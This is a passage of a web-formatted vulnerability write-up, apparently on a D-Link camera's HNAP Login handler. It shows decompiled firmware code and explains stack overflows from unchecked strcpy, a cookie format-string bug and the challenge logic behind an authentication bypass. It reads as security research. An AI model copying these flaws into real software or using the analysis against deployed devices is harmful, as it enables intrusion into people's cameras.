class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">GetDeviceSettings</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> Document; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> Element; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> appended; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">512</span>]; <span class="comment">// [sp+28h] [-450h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">256</span>]; <span class="comment">// [sp+228h] [-250h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">256</span>]; <span class="comment">// [sp+328h] [-150h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">68</span>]; <span class="comment">// [sp+428h] [-50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [sp+46Ch] [-Ch]</span></span><br><span class="line">  __int16 v14; <span class="comment">// [sp+470h] [-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v15; <span class="comment">// [sp+472h] [-6h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v16; <span class="comment">// [sp+474h] [-4h] BYREF</span></span><br><span class="line">  __int16 v17; <span class="comment">// [sp+476h] [-2h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;v9[<span class="number">1</span>], <span class="number">0</span>, <span class="number">0x1FF</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="keyword">sizeof</span>(v10));</span><br><span class="line">  <span class="built_in">memset</span>(v11, <span class="number">0</span>, <span class="keyword">sizeof</span>(v11));</span><br><span class="line">  <span class="built_in">memset</span>(v12, <span class="number">0</span>, <span class="number">65</span>);</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  Document = ixmlDocument_createDocument();</span><br><span class="line">  Element = ixmlDocument_createElement(Document, <span class="string">"GetDeviceSettingsResponse"</span>);</span><br><span class="line">  ixmlElement_setAttribute(Element, <span class="string">"xmlns"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/&gt;"</span>);</span><br><span class="line">  ixmlNode_appendChild(Document, Element);</span><br><span class="line">  ixmlAppendNewElement(Document, Element, <span class="string">"GetDeviceSettingsResult"</span>, <span class="string">"OK"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, Element, <span class="string">"Type"</span>, <span class="string">"ConnectedHomeClient"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v11, <span class="number">0</span>, <span class="keyword">sizeof</span>(v11));</span><br><span class="line">  cfgRead(<span class="string">"System"</span>, <span class="string">"ModelName"</span>, v11);</span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">  <span class="built_in">memset</span>(v12, <span class="number">0</span>, <span class="number">0x41</span>u);</span><br><span class="line">  cfgRead(<span class="string">"CAMSYSTEM"</span>, <span class="string">"CameraName"</span>, v9);</span><br><span class="line">  cfgRead(<span class="string">"CAMSYSTEM"</span>, <span class="string">"CameraName"</span>, v12);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v9) &gt;= <span class="number">0x21</span> )</span><br><span class="line">    v9[<span class="number">33</span>] = <span class="number">0</span>;</span><br><span class="line">  ixmlAppendNewElement(Document, Element, <span class="string">"DeviceName"</span>, v9);</span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">  cfgRead(<span class="string">"INFO"</span>, <span class="string">"BrandName"</span>, v9);</span><br><span class="line">  ixmlAppendNewElement(Document, Element, <span class="string">"VendorName"</span>, v9);</span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">  cfgRead(<span class="string">"INFO"</span>, <span class="string">"Product"</span>, v9);</span><br><span class="line">  ixmlAppendNewElement(Document, Element, <span class="string">"ModelDescription"</span>, v9);</span><br><span class="line">  ixmlAppendNewElement(Document, Element, <span class="string">"ModelName"</span>, v11);</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  net_get_hwaddr(<span class="string">"br0"</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(</span><br><span class="line">    v9,</span><br><span class="line">    <span class="string">"%02X:%02X:%02X:%02X:%02X:%02X"</span>,</span><br><span class="line">    HIBYTE(v13),</span><br><span class="line">    BYTE1(v13),</span><br><span class="line">    BYTE2(v13),</span><br><span class="line">    (<span class="type">unsigned</span> __int8)v13,</span><br><span class="line">    HIBYTE(v14),</span><br><span class="line">    (<span class="type">unsigned</span> __int8)v14);</span><br><span class="line">  ixmlAppendNewElement(Document, Element, <span class="string">"DeviceMacId"</span>, v9);</span><br><span class="line">  cfgRead(<span class="string">"System"</span>, <span class="string">"MainVersion"</span>, &amp;v15);</span><br><span class="line">  cfgRead(<span class="string">"System"</span>, <span class="string">"FirmwareVersion"</span>, &amp;v16);</span><br><span class="line">  cfgRead(<span class="string">"System"</span>, <span class="string">"CustomerVersion"</span>, &amp;v17);</span><br><span class="line">  <span class="built_in">sprintf</span>(v9, <span class="string">"%d.%02d"</span>, v15, v16);</span><br><span class="line">  ixmlAppendNewElement(Document, Element, <span class="string">"FirmwareVersion"</span>, v9);</span><br><span class="line">  ixmlAppendNewElement(Document, Element, <span class="string">"FirmwareRegion"</span>, <span class="string">"Default"</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(v9, <span class="string">"%d.%02d"</span>, v15, v16);</span><br><span class="line">  ixmlAppendNewElement(Document, Element, <span class="string">"LatestFirmwareVersion"</span>, v9);</span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">  cfgRead(<span class="string">"INFO"</span>, <span class="string">"HWVersion"</span>, v9);</span><br><span class="line">  ixmlAppendNewElement(Document, Element, <span class="string">"HardwareVersion"</span>, v9);</span><br><span class="line">  ixmlAppendNewElement(Document, Element, <span class="string">"HNAPVersion"</span>, <span class="string">"0111"</span>);</span><br><span class="line">  cfgRead(<span class="string">"Bonjour"</span>, <span class="string">"PresentationURL"</span>, v10);</span><br><span class="line">  <span class="keyword">if</span> ( v10[<span class="number">0</span>] )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">sprintf</span>(v9, <span class="string">"http://%s.local./"</span>, v10);</span><br><span class="line">    v2 = v9;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( v12[<span class="number">0</span>] )</span><br><span class="line">      <span class="built_in">sprintf</span>(v9, <span class="string">"http://%s.local./"</span>, v12);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">sprintf</span>(v9, <span class="string">"http://%s.local./"</span>, v11);</span><br><span class="line">    v2 = v9;</span><br><span class="line">  }</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v3++ &lt; <span class="built_in">strlen</span>(v9) )</span><br><span class="line">  {</span><br><span class="line">    *v2 = *(_WORD *)(_ctype_tolower + <span class="number">2</span> * *v2);</span><br><span class="line">    ++v2;</span><br><span class="line">  }</span><br><span class="line">  ixmlAppendNewElement(Document, Element, <span class="string">"PresentationURL"</span>, v9);</span><br><span class="line">  ixmlAppendNewElement(Document, Element, <span class="string">"CAPTCHA"</span>, <span class="string">"false"</span>);</span><br><span class="line">  appended = ixmlAppendNewElement(Document, Element, <span class="string">"ModuleTypes"</span>, <span class="number">0</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, appended, <span class="string">"string"</span>, <span class="string">"Optical Recognition"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, appended, <span class="string">"string"</span>, <span class="string">"Environmental Sensor"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, appended, <span class="string">"string"</span>, <span class="string">"Camera"</span>);</span><br><span class="line">  v6 = ixmlAppendNewElement(Document, Element, <span class="string">"SOAPActions"</span>, <span class="number">0</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/Login&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/GetDCHPolicy&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/SetDCHPolicy&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/GetNotifierSettings&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/SetNotifierSettings&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/GetEventSupportList&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/GetActionSupportList&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/PushDCHEvent&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/GetmydlinkSupportStatus&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/GetmydlinkRegInfo&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/SetmydlinkReg&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/SetmydlinkUnregistration&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/GetDeviceSettings&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/SetDeviceSettings&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/GetDeviceSettings2&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/SetDeviceSettings2&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/GetModuleProfile&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/SetModuleProfile&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/SetTriggerWirelessSiteSurvey&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/GetSiteSurvey&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/GetWLanRadios&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/GetAPClientSettings&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/SetAPClientSettings&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, v6, <span class="string">"string"</span>, <span class="string">"&lt;http://purenetworks.com/HNAP1/GetMultipleHNAPs&gt;"</span>);</span><br><span class="line">  ixmlAppendNewElement(Document, Element, <span class="string">"SubDeviceURLs"</span>, <span class="number">0</span>);</span><br><span class="line">  v7 = ixmlNode_cloneNode(Document, <span class="number">1</span>);</span><br><span class="line">  ixmlDocument_free(Document);</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h3><p>In the Login function, I can enter Action, the Action will strcpy to v42, but program do not check size, resulting in stack overflow.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">Login</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">ElementByTag = ixmlGetElementByTag(a1, <span class="string">"Login"</span>);</span><br><span class="line">  v5 = ElementByTag;</span><br><span class="line">  <span class="keyword">if</span> ( !ElementByTag )</span><br><span class="line">  {</span><br><span class="line">    ixmlAppendNewElement(Document, Element, <span class="string">"LoginResult"</span>, <span class="string">"failed"</span>);</span><br><span class="line">    v15 = Document;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_49;</span><br><span class="line">  }</span><br><span class="line">  ElementValueByTag = (<span class="type">const</span> <span class="type">char</span> *)ixmlGetElementValueByTag(ElementByTag, <span class="string">"Action"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ElementValueByTag )</span><br><span class="line">    <span class="built_in">strcpy</span>(v42, ElementValueByTag);</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>In the Login function, I can enter Username and LoginPassword, the username&amp;password will strcpy to v36&amp;v38, but program do not check the size, resulting in stack overflow.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">Login</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">v16 = (<span class="type">const</span> <span class="type">char</span> *)ixmlGetElementValueByTag(v5, <span class="string">"Username"</span>);</span><br><span class="line">        v17 = (<span class="type">const</span> <span class="type">char</span> *)ixmlGetElementValueByTag(v5, <span class="string">"LoginPassword"</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v16 )</span><br><span class="line">        {</span><br><span class="line">          <span class="built_in">strcpy</span>((<span class="type">char</span> *)v36, v16);</span><br><span class="line">          <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span> *)v36, <span class="string">"Admin"</span>) )</span><br><span class="line">            <span class="built_in">snprintf</span>((<span class="type">char</span> *)v36, <span class="number">0x20</span>u, <span class="string">"%s"</span>, <span class="string">"admin"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> ( v17 )</span><br><span class="line">          <span class="built_in">strcpy</span>(v38, v17);</span><br><span class="line">        v53 = (<span class="type">const</span> <span class="type">char</span> *)v36;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"username: %s\\n"</span>, (<span class="type">const</span> <span class="type">char</span> *)v36);</span><br><span class="line">        v55 = v38;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"loginPassword: %s\\n"</span>, v38);</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Cookie-Format-String"><a href="#Cookie-Format-String" class="headerlink" title="Cookie Format String"></a>Cookie Format String</h3><p>In the Login function, the program use the getenv function to obtain COOKIE value, and use the snprintf function to put the value into v39, without %s, resulting format string vuln</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">Login</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">v7 = getenv(<span class="string">"COOKIE"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 &amp;&amp; *v7 )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">memset</span>(v43, <span class="number">0</span>, <span class="keyword">sizeof</span>(v43));</span><br><span class="line">    v9 = getenv(<span class="string">"COOKIE"</span>);</span><br><span class="line">    <span class="built_in">snprintf</span>(v43, <span class="number">0x80</span>u, <span class="string">"%s"</span>, v9);</span><br><span class="line">    v10 = <span class="built_in">strstr</span>(v43, <span class="string">"uid="</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v10 )</span><br><span class="line">    {</span><br><span class="line">      v11 = v10 + <span class="number">4</span>;</span><br><span class="line">      v12 = <span class="built_in">strchr</span>(v10 + <span class="number">4</span>, <span class="number">59</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v12 )</span><br><span class="line">        *v12 = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">snprintf</span>((<span class="type">char</span> *)v39, <span class="number">0xB</span>u, v11);</span><br><span class="line">      v13 = (<span class="type">const</span> <span class="type">char</span> *)&amp;v52[<span class="number">18</span>];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">snprintf</span>((<span class="type">char</span> *)v39, <span class="number">0xB</span>u, v43);</span><br><span class="line">      v13 = (<span class="type">const</span> <span class="type">char</span> *)&amp;v52[<span class="number">18</span>];</span><br><span class="line">    }</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Authentication-Bypass"><a href="#Authentication-Bypass" class="headerlink" title="Authentication Bypass"></a>Authentication Bypass</h3><p>In the Login function, Enter the Username and LoginPassword, then call usrGetPass function to obtain the password corresponding to the Username.</p><p><code>challenge + challenge length + public_key+password + public_key length+password length</code> performs hmac_md5 function to get private key.</p><p>Then, <code>challenge + challenge length + private_key + private_key length</code> performs hmac_md5 function to get <code>login_password</code>.</p><p>If <code>login_password</code> equal to save password, then login successful.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">Login</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">v16 = (<span class="type">const</span> <span class="type">char</span> *)ixmlGetElementValueByTag(v5, <span class="string">"Username"</span>);</span><br><span class="line">        v17 = (<span class="type">const</span> <span class="type">char</span> *)ixmlGetElementValueByTag(v5, <span class="string">"LoginPassword"</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v16 )</span><br><span class="line">        {</span><br><span class="line">          <span class="built_in">strcpy</span>((<span class="type">char</span> *)v36, v16);</span><br><span class="line">          <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span> *)v36, <span class="string">"Admin"</span>) )</span><br><span class="line">            <span class="built_in">snprintf</span>((<span class="type">char</span> *)v36, <span class="number">0x20</span>u, <span class="string">"%s"</span>, <span class="string">"admin"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> ( v17 )</span><br><span class="line">          <span class="built_in">strcpy</span>(v38, v17);</span><br><span class="line">        v53 = (<span class="type">const</span> <span class="type">char</span> *)v36;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"username: %s\\n"</span>, (<span class="type">const</span> <span class="type">char</span> *)v36);</span><br><span class="line">        v55 = v38;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"loginPassword: %s\\n"</span>, v38);</span><br><span class="line">        <span class="built_in">memset</span>(v51, <span class="number">0</span>, <span class="number">53</span>);</span><br><span class="line">        <span class="built_in">memset</span>(v49, <span class="number">0</span>, <span class="number">33</span>);</span><br><span class="line">        <span class="built_in">memset</span>(v50, <span class="number">0</span>, <span class="number">33</span>);</span><br><span class="line">        v45 = <span class="number">0</span>;</span><br><span class="line">        v46 = <span class="number">0</span>;</span><br><span class="line">        v47 = <span class="number">0</span>;</span><br><span class="line">        v48 = <span class="number">0</span>;</span><br><span class="line">        usrInit(<span class="number">0</span>);</span><br><span class="line">        usrGetPass(v53, v50, <span class="number">33</span>);</span><br><span class="line">        usrFree();</span><br><span class="line">        v54 = (<span class="type">const</span> <span class="type">char</span> *)v52;</span><br><span class="line">        <span class="built_in">sprintf</span>(v51, <span class="string">"%s%s"</span>, (<span class="type">const</span> <span class="type">char</span> *)v52, v50);</span><br><span class="line">        v53 = (<span class="type">const</span> <span class="type">char</span> *)&amp;v52[<span class="number">9</span>];</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"My challenge: %s\\n"</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;v52[<span class="number">9</span>]);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"My public_key: %s\\n"</span>, v54);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"My password: %s\\n"</span>, v50);</span><br><span class="line">        v18 = <span class="built_in">strlen</span>(v53);</span><br><span class="line">        v19 = <span class="built_in">strlen</span>(v51);</span><br><span class="line">        hmac_md5(v53, v18, v51, v19);</span><br><span class="line">        <span class="built_in">sprintf</span>(v44, <span class="string">"%08X%08X%08X%08X"</span>, v45, v46, v47, v48);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"My private_key: %s\\n"</span>, v44);</span><br><span class="line">        v45 = <span class="number">0</span>;</span><br><span class="line">        v46 = <span class="number">0</span>;</span><br><span class="line">        v47 = <span class="number">0</span>;</span><br><span class="line">        v48 = <span class="number">0</span>;</span><br><span class="line">        v54 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">strlen</span>(v53);</span><br><span class="line">        v20 = <span class="built_in">strlen</span>(v44);</span><br><span class="line">        hmac_md5(v53, v54, v44, v20);</span><br><span class="line">        <span class="built_in">sprintf</span>(v49, <span class="string">"%08X%08X%08X%08X"</span>, v45, v46, v47, v48);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"My login_password: %s\\n"</span>, v49);</span><br><span class="line">        v21 = <span class="built_in">strcmp</span>(v55, v49) == <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Check authStatus: %d\\n"</span>, v21);</span><br><span class="line">        v22 = Document;</span><br><span class="line">        <span class="keyword">if</span> ( v21 )</span><br><span class="line">        